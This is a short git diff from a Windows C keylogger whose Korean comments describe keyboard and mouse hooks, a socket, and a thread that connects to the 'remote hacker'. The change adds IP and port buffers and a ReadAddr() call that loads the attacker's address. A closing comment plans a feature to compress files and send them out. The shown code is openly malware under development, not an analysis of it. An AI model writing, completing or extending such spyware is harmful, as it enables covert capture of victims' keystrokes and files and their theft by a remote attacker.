@@ -22,6 +22,9 @@ HookProc Kuninstallhook;
 HookProc Minstallhook;//마우스
 HookProc Muninstallhook;
 
+char ip[17];
+char Port[6];
+
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할과 같으나 받는 인자가 다르므로 api프로그래밍시에는 WinMain을 사용
 	, LPSTR lpszCmdParam, int nCmdShow)
@@ -56,6 +59,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할�
 
 	hWndMain = hWnd;
 	//소켓생성
+	ReadAddr();
 	CreateSocket();
 	//원격해커에게 접속시도할 쓰레드 생성 ,USB 디텍터 스레드 실행
 	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
@@ -131,3 +135,5 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 
 
 //키로거 강제종료시 종료코드전달안됨
+//파일앞축후 전송기능 추가
+//ReadAddr 에러 _tcstok에러
